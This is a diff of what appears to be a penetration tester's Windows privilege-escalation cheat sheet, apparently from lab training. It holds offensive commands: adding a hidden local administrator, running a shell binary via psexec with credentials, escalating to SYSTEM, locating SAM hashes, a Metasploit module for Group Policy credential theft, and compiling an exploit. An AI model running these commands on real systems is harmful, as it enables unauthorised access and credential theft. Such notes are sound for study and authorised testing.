@@ -561,7 +561,7 @@ net localgroup Administrators myadmin /add
 rdesktop -u myadmin -p Pass1234 10.11.1.218 -g 80%
 ```
 Run as:
-`psexec -u alice -p aliceishere C:\HFS\shellm80c.exe`
+`psexec -u alice -p alicei123 C:\HFS\shellm80c.exe`
 
 SAM:
 So the three locations of the SAM\Hashes are:
@@ -595,6 +595,10 @@ Lookup windows version from product version in C:\Windows\explorer.exe:
 
 PE (switch admin user to NT Authority/System):
 `psexec.exe -s cmd`
+
+`post/windows/gather/credentials/gpp` Meterpreter Search GPP
+
+[Windows Exploit Sugesster](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
 
 Compile
 `i686-w64-mingw32-gcc 646.c -lws2_32 -o 646.exe`
